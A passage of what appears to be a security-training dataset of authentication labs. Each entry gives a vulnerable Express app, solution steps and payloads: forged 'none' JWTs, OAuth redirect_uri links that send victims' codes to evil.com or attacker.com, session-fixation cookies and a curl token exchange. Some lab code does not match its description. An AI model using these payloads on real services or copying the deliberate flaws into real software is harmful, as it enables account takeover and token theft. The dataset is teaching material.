        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.username}`); } catch (e) { console.error('JWT error:', e.message); res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algo Lab running on port ${PORT}`));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Final JWT: base64(header).base64(payload). (no signature)",
          "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation",
        "Lab Description": "The OAuth implementation accepts arbitrary redirect URIs without proper whitelisting, allowing an attacker to intercept tokens. This can be abused to steal Carlos's OAuth access token. To solve the lab, leak his token and use it to access his account data.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a malicious redirect URI (e.g., http://evil.com/callback).",
          "Craft a login link with the OAuth flow, replacing the redirect_uri with your attacker site.",
          "Send the malicious link to Carlos and wait for the redirection with his token.",
          "Extract the access token from your server logs or query string.",
          "Replay the token via Postman or Burp to access /my-account with Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Math.random().toString(36).substring(2); tokens[user] = token; console.log('Generated token:', token); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.keys(tokens).find(k => tokens[k] === token); if (user) res.send(`Welcome to ${user}'s account`); else res.status(401).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on port ${PORT}`));",
        "payloads": [
          "https://target.com/auth?redirect_uri=http://evil.com/callback&user=carlos",
          "Malicious site receives: http://evil.com/callback#access_token=abcd123",
          "Authorization: Bearer abcd123"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
      
        "Lab Description": "The application does not invalidate or regenerate the session ID upon successful login. This enables an attacker to fix a session for a victim prior to authentication. The application reuses existing session tokens across user privilege states. To solve: Hijack Carlos's session after setting it yourself and gaining access to /my-account.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "1. Use Burp Suite to intercept a login request. Observe that session cookies (e.g., `sessionId`) remain unchanged before and after login.",
          "2. Use Burp to register/login as your own user and capture your session cookie.",
          "3. Send a crafted phishing link to Carlos that forces him to log in while using your attacker-controlled session ID (`sessionId=attacker-session`).",
          "4. After Carlos logs in, use the same `sessionId=attacker-session` to access `/my-account`.",
          "5. Confirm the session hijack by verifying access to Carlos’s account page."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secure123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.redirect('/login'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      
        "payloads": [
          "sessionId=attacker-session",
          "Set-Cookie: sessionId=attacker-session",
          "URL with attacker session: http://example.com/login?sessionId=attacker-session"
        ]
      },
      {
        "Lab scenario": "JWT tampering via 'none' algorithm in token verification",
      
        "Lab Description": "The application accepts JWT tokens for authentication and does not properly enforce algorithm constraints. It accepts unsigned tokens by trusting the 'none' algorithm. To solve: Modify your token to impersonate Carlos and access his account page.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "1. Use Postman to log in and capture the issued JWT from the Authorization header.",
          "2. Decode the token on jwt.io and modify the payload to { \"username\": \"carlos\" }.",
          "3. Set the header to { \"alg\": \"none\" } and remove the signature section completely.",
          "4. Send a new request to /my-account using the manipulated token in the Authorization header.",
          "5. Verify access to Carlos's account without needing a valid signature."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'jwt-secret'); res.json({ token }); } else res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Tampering Lab running on port 4000'));",
      
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: base64(header).base64(payload).",
          "Authorization: Bearer <tampered-token>"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
      
        "Lab Description": "The application improperly validates redirect URIs during OAuth flows, allowing an attacker to redirect tokens to arbitrary domains. The `redirect_uri` parameter is partially whitelisted, but allows open redirects via parameter manipulation. To solve: Steal Carlos’s OAuth token and access his protected resources.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "1. Use Burp Suite to intercept an OAuth login flow request. Identify the `redirect_uri` parameter.",
          "2. Modify the `redirect_uri` to include a trusted prefix plus `@attacker.com` to bypass validation (e.g., `https://trusted.com@evil.com/oauth`)",
          "3. Host a page on attacker.com to log query strings or fragments (e.g., with `?code=xyz`).",
          "4. Send Carlos a phishing link containing the modified redirect URI.",
          "5. When Carlos logs in, his token is sent to your malicious endpoint. Use this code to retrieve a full access token via Postman.",
          "6. Use the stolen token to call `/my-account` as Carlos."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}?code=${token}`); }); app.get('/my-account', (req, res) => { const { token } = req.query; if (token === 'access-token-for-carlos') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on port 4000'));",
      
        "payloads": [
          "redirect_uri=https://trusted.com@evil.com/capture",
          "Phishing link: https://example.com/oauth?redirect_uri=https://trusted.com@evil.com/capture",
          "Captured Code: code=access-token-for-carlos",
          "Token reuse: /my-account?token=access-token-for-carlos"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm in login token verification",
        "Lab Description": "This lab's login system is vulnerable due to insecure JWT handling. The application accepts the 'alg' value from the header without verification. An attacker can tamper with the token's payload and set the 'alg' to 'none' to forge authentication. To solve: forge a valid JWT for user 'carlos' and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a login request and capture the JWT token from the Set-Cookie response header.",
          "2. Decode the JWT using jwt.io or Postman. Note the structure and content of the payload and header.",
          "3. Modify the payload to {\"username\":\"carlos\"} and change the header to {\"alg\":\"none\"}. Remove the signature part.",
          "4. Reconstruct the JWT with base64-encoded header and payload separated by a dot ('.') and omit the signature.",
          "5. Use Burp or Postman to replace your JWT cookie with the forged one. Refresh the browser or resend a request to /my-account to verify success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const secret = 'supersecretkey'; app.get('/my-account', (req, res) => { const token = req.cookies.token; const user = jwt.verify(token, secret); if (user && user.username === 'carlos') { res.send('Access granted to Carlos account'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
        ]
      },
      {
        "Lab scenario": "Session fixation in session ID issued on login via Set-Cookie header",
        "Lab Description": "This application allows session fixation through predictable session tokens. The server issues session IDs in a predictable manner and does not regenerate them after successful login. To solve: fix a session ID for 'carlos' before he logs in, and then reuse it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to register a new account and observe the session cookie named 'sid' in the Set-Cookie response header.",
          "2. Note that session IDs are sequential or time-based (e.g., sid=USER12345). Guess a session ID one step ahead.",
          "3. Send a crafted phishing request to Carlos with the session ID you fixed (e.g., sid=USER12346).",
          "4. Once Carlos logs in, that session ID will be authenticated to his account.",
          "5. Reuse the fixed session cookie (sid=USER12346) in your browser and navigate to /my-account to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; const sessions = {}; let counter = 1000; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = 'USER' + counter++; sessions[sid] = username; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') { res.send('Welcome to Carlos account'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
        "payloads": [
          "sid=USER12346",
          "sid=USER1002",
          "sid=USER1001"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
        "Lab Description": "This lab demonstrates an OAuth 2.0 misconfiguration where the `redirect_uri` parameter is insufficiently validated, allowing attackers to steal authorization codes. To solve: capture a valid OAuth code for 'carlos' using a malicious redirect URI and exchange it for a token to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Identify the authorization request URL using Burp (e.g., /auth?client_id=xyz&redirect_uri=https://site.com/callback).",
          "2. Modify the redirect_uri to point to your own domain (https://evil.com/code-stealer) while preserving the hostname prefix.",
          "3. Host a listener on https://evil.com/code-stealer to capture the authorization code via query parameter.",
          "4. Phish the victim into clicking the crafted OAuth URL. After login, the code is sent to your redirect URI.",
          "5. Use Postman to POST the captured code to /oauth/token endpoint with the client credentials to obtain an access token.",
          "6. Add the token to the Authorization header and send a GET request to /my-account to access Carlos's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect'); const authCode = 'oauth-carlos-code'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'oauth-carlos-code') { res.json({ access_token: 'token-carlos-123' }); } else { res.status(403).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Redirect Lab running on http://localhost:' + PORT));",
        "payloads": [
          "https://attacker.com/code-stealer?code=oauth-carlos-code",
          "https://evil.com/callback?code=oauth-carlos-code",
          "Authorization: Bearer token-carlos-123"
        ]
      },
      {
        "Lab scenario": "Session Fixation in login flow",
        "Lab Description": "The application improperly handles session tokens during login. Instead of rotating the session ID after authentication, it preserves the existing token. The application allows an attacker to fix a session ID before the victim logs in. To solve: hijack Carlos's session using a fixed session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to capture a valid unauthenticated session cookie from /login",
          "Send a crafted phishing link to Carlos with the fixed session ID in the Cookie header",
          "Wait for Carlos to log in with the fixed session (simulate via Burp's manual login replay)",
          "Use the same session ID in your browser to gain access to Carlos's session",
          "Visit /my-account using the fixed session and confirm access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" type=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: connect.sid=sess:12345abcde;",
          "Phishing URL sent with fixed cookie set in request"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm bypass in access tokens",
        "Lab Description": "The application uses JWT tokens for authorization but does not properly verify the signing algorithm. By setting the algorithm to 'none', attackers can forge valid tokens without the secret key. To solve: access Carlos's account page using a tampered JWT.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture the Authorization header after logging in",
          "Decode the JWT using jwt.io or Burp Decoder",
          "Craft a new token with {\"alg\": \"none\"} in the header and \"username\": \"carlos\" in the payload",
          "Sign the JWT without a signature section (empty after last dot)",
          "Replace the original token with the forged one and send a request to /my-account"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwt123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); res.send(`Welcome, ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [tampered_token]"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in callback URL",
        "Lab Description": "The OAuth implementation fails to properly validate redirect URIs. Attackers can inject arbitrary URLs to steal authorization codes or tokens. To solve: hijack Carlos’s OAuth flow by injecting a malicious redirect URI to capture his access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to send a GET request to the OAuth login endpoint with a crafted redirect_uri parameter pointing to your malicious domain",
          "Simulate Carlos clicking the malicious login URL (use a temporary redirect server or Burp Collaborator)",
          "Intercept the code/token from the query string after OAuth provider redirects to your malicious domain",
          "Exchange the code/token for user data using the OAuth provider’s token endpoint",
          "Access the protected /my-account resource using the stolen token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Manipulation Lab running'));",
        "payloads": [
          "https://victim-app.com/auth?redirect_uri=https://evil.com/callback",
          "https://oauth-provider.com/auth?client_id=abc&redirect_uri=https://evil.com/callback&response_type=code"
        ]
      },
      {
        "Lab scenario": "Stay logged in cookie brute-force vulnerability in login mechanism",
        "Lab Description": "The application's 'Stay logged in' feature uses a predictable session cookie format. Upon successful login, the server issues a persistent cookie without strong randomness or HMAC validation. To solve: Brute-force a valid session cookie to impersonate Carlos and access his account page.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "1. Use Burp Suite to log in with your own account and inspect the 'stay-logged-in' cookie format in the response.",
          "2. Observe that the cookie format is 'username:timestamp' without encryption or HMAC.",
          "3. Generate cookie variations for username 'carlos' with valid timestamps from recent login attempts using a script or Burp Intruder.",
          "4. Replace your cookie with the brute-forced 'carlos' variant in the browser using Burp Proxy or browser DevTools.",
          "5. Navigate to /my-account to confirm successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password, stayLoggedIn } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (stayLoggedIn) { const cookie = `${username}:${Date.now()}`; res.cookie('stay-logged-in', cookie); } res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const cookie = req.cookies['stay-logged-in']; if (cookie && cookie.startsWith('carlos')) { return res.send('Carlos Account Page'); } res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Stay Logged In Cookie Brute-force Lab running on port 4000'));",
        "payloads": [
          "carlos:1714725000000",
          "carlos:1714725050000",
          "carlos:1714725100000"
        ]
      },
      {
        "Lab scenario": "JWT signature validation bypass via 'none' algorithm in authentication token",
        "Lab Description": "The application uses JWT for session management but fails to properly validate the token signature when the 'alg' field is set to 'none'. To solve: Forge a valid-looking token granting admin access and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman or Burp Suite to log in and capture the JWT token issued in the Authorization header.",
          "2. Decode the token using jwt.io and inspect the 'alg' and 'sub' claims.",
          "3. Modify the 'alg' header to 'none' and change the 'sub' claim to 'admin'.",
          "4. Reconstruct the token without a signature using jwt.io or a script.",
          "5. Use the forged token in the Authorization header and access /admin to confirm privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.sub === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "{\"alg\":\"none\"}.{\"sub\":\"admin\"}.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
        ]
      },
      {
        "Lab scenario": "OAuth authorization code interception in redirect_uri misconfiguration",
        "Lab Description": "The application uses OAuth for login, but the redirect_uri parameter is not properly validated, allowing attackers to intercept authorization codes. To solve: Intercept an authorization code for Carlos by injecting your own redirect URI and gain access to their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth flow and observe the authorization URL with client_id and redirect_uri parameters.",
          "2. Modify the redirect_uri to point to your server (e.g. https://attacker.com/callback) and capture the intercepted code.",
          "3. On your server, listen for the callback and extract the authorization code from the query string.",
          "4. Use Postman to send a POST request to the token endpoint with the stolen code, client_id, and malicious redirect_uri.",
          "5. Use the obtained access_token to retrieve Carlos's profile data via the /me endpoint and confirm lab success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const oauth = require('simple-oauth2'); const oauthConfig = { client: { id: 'app-client-id', secret: 'secret' }, auth: { tokenHost: 'https://auth-server.com', authorizePath: '/authorize', tokenPath: '/token' } }; app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://auth-server.com/authorize?response_type=code&client_id=app-client-id&redirect_uri=${redirectUri}`; res.redirect(url); }); app.listen(4000, () => console.log('OAuth Redirect URI Injection Lab running on port 4000'));",
        "payloads": [
          "https://attacker.com/callback",
          "https://evil.com/redirect",
          "curl -X POST https://auth-server.com/token -d 'grant_type=authorization_code&code=XYZ123&redirect_uri=https://evil.com/redirect&client_id=app-client-id'"
        ]
      },
      {
        "Lab scenario": "Session Fixation vulnerability in login process",
        "Lab Description": "The session management mechanism allows the session identifier to be set via a query parameter before login. The application fails to regenerate a new session ID after successful authentication, allowing attackers to fixate a session ID and impersonate a user after they log in. To solve: hijack Carlos's session after forcing him to log in via a session you control.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login request and observe that the application accepts a sessionId as a query parameter.",
          "2.Generate a session fixation link: /login?sessionId=attackerSession123 and send it to the victim via email or open redirect.",
          "3.On the server, monitor incoming requests and wait for the victim to log in using the fixed session ID.",
          "4.After login, reuse the same sessionId=attackerSession123 cookie to access Carlos's account.",
          "5.Visit /my-account while authenticated with the fixed session ID to verify takeover and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Account page of ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "/login?sessionId=attackerSession123",
          "Cookie: sessionId=attackerSession123"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in Authorization Header",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but fails to properly validate the signature algorithm. The backend accepts tokens using the 'none' algorithm, allowing an attacker to forge arbitrary tokens without a signature. To solve: tamper with the JWT to impersonate Carlos.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Burp Suite to capture the Authorization header after logging in as a regular user.",
          "2.Decode the JWT using jwt.io or jwt-tool and examine its header and payload structure.",
          "3.Change the 'alg' field in the header from 'HS256' to 'none', and set the payload to {\"username\":\"carlos\"}.",
          "4.Base64-encode the modified header and payload, omitting the signature part completely.",
          "5.Replay the request with the tampered JWT in the Authorization header to access Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); } catch (err) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [token_above]"
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation in login flow",
        "Lab Description": "The application implements OAuth for third-party authentication but fails to validate the redirect_uri parameter against a whitelist. This allows an attacker to abuse the login process and capture authorization codes or tokens. To solve: redirect the victim to a malicious callback, extract the token, and impersonate them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP or Burp Suite to intercept the OAuth login flow and locate the redirect_uri parameter.",
          "2.Craft a login URL with redirect_uri pointing to your attacker-controlled server (e.g., https://attacker.site/callback).",
          "3.Send the link to the victim and wait for them to authorize the app.",
          "4.Extract the authorization code or token from the redirected request to your server.",
          "5.Use Postman to exchange the code for an access token and call /my-account as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; if (!user) return res.status(400).send('Missing user'); const code = Buffer.from(`${user}-code`).toString('base64'); tokens[code] = user; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/token', (req, res) => { const { code } = req.query; const user = tokens[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: `${user}-access-token` }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token?.includes('carlos')) res.send('Access granted to carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
        "payloads": [
          "https://example.com/auth?redirect_uri=https://attacker.site/callback&user=carlos",
          "Authorization: Bearer carlos-access-token"
        ]
      },
      {
        "Lab scenario": "Session fixation via login flow in session middleware",
        "Lab Description": "The application fails to regenerate the session ID after login, allowing an attacker to fix a session before authentication. The session ID remains unchanged after login, enabling session hijacking. To solve: hijack Carlos’s session using a fixed session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept your unauthenticated request to /login and note the Set-Cookie header.",
          "2. Send this session cookie to Burp Repeater and test that the session remains valid pre-login.",
          "3. Use curl/Postman to send a login request with valid credentials but reuse the session cookie.",
          "4. Send the fixed session ID to Carlos (via XSS, phishing, or any other out-of-band vector).",
          "5. Once Carlos logs in using the fixed session ID, reuse the same cookie to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notsosecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.username = username; res.send(`Welcome ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send(`Account of ${req.session.username}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Set-Cookie: connect.sid=attacker-fixed-id",
          "GET /my-account with Cookie: connect.sid=attacker-fixed-id"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass using none algorithm in Authorization header",
        "Lab Description": "The app uses JWT for session management but fails to validate the 'alg' claim properly. It accepts unsigned tokens when 'alg' is set to 'none'. To solve: forge a valid token for Carlos without signing it, and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in as a regular user and inspect the JWT token from the Authorization header using Burp or Postman.",
          "2. Decode the token and observe the algorithm used. Modify the 'alg' to 'none' and set the payload to {\"username\":\"carlos\"}.",
          "3. Remove the signature and re-encode the token using jwt.io or Python.",
          "4. Send the forged token as Authorization: Bearer <forged_token> using Postman.",
          "5. Access /my-account endpoint and verify that you are logged in as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Unauthorized'); res.send(`Welcome ${payload.payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation in OAuth provider callback",
        "Lab Description": "The application integrates OAuth login via a third-party provider but improperly validates redirect URIs. It allows open redirection using the `redirect_uri` parameter. To solve: manipulate the `redirect_uri` to hijack the access token and access Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp to initiate an OAuth login and capture the full authorization request URL.",
          "2. Modify the `redirect_uri` parameter to an attacker-controlled domain (e.g., attacker.com).",
          "3. Deploy a token-capturing script on attacker.com to log incoming tokens.",
          "4. Trick Carlos into clicking the OAuth login link with the modified `redirect_uri`.",
          "5. Capture the token and use it to access /my-account using Postman with Authorization: Bearer <stolen_token>."
        ],
        "Vulnerability name": "Authentication",
